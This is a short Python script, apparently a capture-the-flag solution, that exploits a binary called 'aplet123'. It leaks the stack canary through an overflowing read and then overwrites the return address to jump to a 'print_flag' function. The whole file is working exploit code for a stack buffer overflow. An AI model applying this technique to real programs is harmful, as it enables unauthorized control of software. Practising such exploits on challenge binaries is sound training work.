#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./aplet123_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("./ld-linuix")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b""
    payload += b"A" * 0x45
    payload += b"i'm"
    io.sendlineafter(b"hello\n", payload)
    io.recvuntil(b"hi ")
    canary = (ptr.u64(io.recvuntil(b", i'm", drop=True)) << 8) & 0xFFFFFFFFFFFFFFFF
    ptr.logger.info(f"canary: {hex(canary)}")

    payload = b""
    payload += b"A" * 0x48
    payload += ptr.p64(canary)
    payload += b"A" * 8
    payload += ptr.p64(unwrap(exe.symbol("print_flag")))
    io.sendline(payload)
    io.sendline(b"bye")

    io.interactive()
    return


if __name__ == "__main__":
    main()
